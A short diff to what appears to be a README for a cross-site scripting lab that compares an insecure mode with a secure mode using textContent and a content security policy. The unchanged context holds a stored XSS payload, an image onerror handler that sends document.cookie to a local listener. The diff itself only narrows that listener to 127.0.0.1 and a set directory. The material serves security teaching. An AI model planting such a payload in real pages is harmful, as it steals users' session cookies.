@@ -11,6 +11,6 @@ the note. SECURE mode renders with textContent AND sends CSP default-src 'self'
    <img src=x onerror="new Image().src='http://localhost:9000/steal?c='+document.cookie">
 
    Run a listener first to catch it:
-   python3 -m http.server 9000     # watch the ?c= query in its log
+   python3 -m http.server 9000 -b 127.0.0.1 -d attacks     # watch the ?c= query in its log
 
 3. Persistence check — reload the page, payload fires again (it's stored in DB).
